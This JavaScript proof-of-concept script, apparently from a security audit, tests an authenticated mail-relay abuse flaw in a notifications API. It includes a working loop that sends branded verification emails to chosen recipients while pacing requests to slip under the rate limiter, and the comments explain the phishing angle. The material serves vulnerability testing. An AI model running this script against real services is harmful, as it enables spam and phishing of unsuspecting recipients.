/**
 * NOTIFY-ABUSE-001 — Authenticated mail-relay abuse (HIGH)
 *
 * PUT /api/v0/notifications accepts any RFC-valid email as `email`. When
 * the email differs from existing notification.email AND notification.pendingEmail,
 * the handler:
 *   1. sets pendingEmail (lowercased+trimmed),
 *   2. signs a 30-min email-verify JWT,
 *   3. sends a "Verify email" transactional message to the supplied address
 *      via the configured EMAIL_PROVIDER (Mailtrap or Google Workspace),
 *   4. returns 200.
 *
 * Rate limit: notificationsWriteLimiter is 10/min per authenticated user.
 * The handler also fans out a real provider send on each call (no dedupe
 * window per recipient address). One signed-in DRep can therefore send up
 * to 600 branded "Verify your email" messages per hour to attacker-chosen
 * recipients, bearing legitimate Ekklesia/Intersect branding and a real
 * (functioning, signed-by-server) verification link in their headers.
 *
 * Why this is more than a UX/spam nuisance:
 *   - The link itself is a real, signed verify token. If a recipient
 *     clicks the CTA (frontend issues POST /api/v0/notifications/verify),
 *     the attacker's account flips its verified `notification.email` to
 *     the recipient's address — receiving all subsequent digest emails for
 *     that account. Combined with `notification.schedule` admin reach
 *     (e.g. impersonating a CC candidate or budget proposer), this is a
 *     plausible phishing vector against ecosystem participants.
 *
 * Prereqs (env):
 *   API       - http://localhost:3001
 *   COOKIE    - auth cookie of any authenticated user
 *   TARGETS   - comma-separated list of throwaway addresses to send to
 *
 * Pass criteria (vulnerable):
 *   N requests where N == #TARGETS, each returning 200 and `emailSendFailed: false`.
 *
 * Pass criteria (mitigated):
 *   - Per-recipient dedupe (the same address is rejected within a
 *     time-bounded window even across different sessions), OR
 *   - Cooldown enforced before the next pendingEmail rotation, OR
 *   - rate limit < #TARGETS so successive requests 429.
 */
const API = process.env.API ?? "http://localhost:3001";
const COOKIE = process.env.COOKIE ?? "";
const TARGETS = (process.env.TARGETS ?? "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

if (!COOKIE || TARGETS.length === 0) {
  console.error("Set COOKIE and TARGETS=a@x,b@y,...");
  process.exit(2);
}

async function rotate(email) {
  const t0 = Date.now();
  const res = await fetch(`${API}/api/v0/notifications`, {
    method: "PUT",
    headers: { "Content-Type": "application/json", Cookie: COOKIE },
    body: JSON.stringify({ email }),
  });
  const body = await res.json().catch(() => ({}));
  return { email, status: res.status, ms: Date.now() - t0, body };
}

const results = [];
for (const t of TARGETS) {
  const r = await rotate(t);
  results.push(r);
  console.log(`${r.status} -> ${t} in ${r.ms}ms (sendFailed=${r.body?.emailSendFailed})`);
  // Modest delay to avoid the rate limiter while still demonstrating the
  // abuse rate. Tune in real testing.
  await new Promise((res) => setTimeout(res, 7000));
}

const successes = results.filter(
  (r) => r.status === 200 && r.body?.emailSendFailed === false,
).length;
console.log(`\n${successes}/${results.length} sends succeeded.`);
process.exit(successes >= 2 ? 0 : 1);
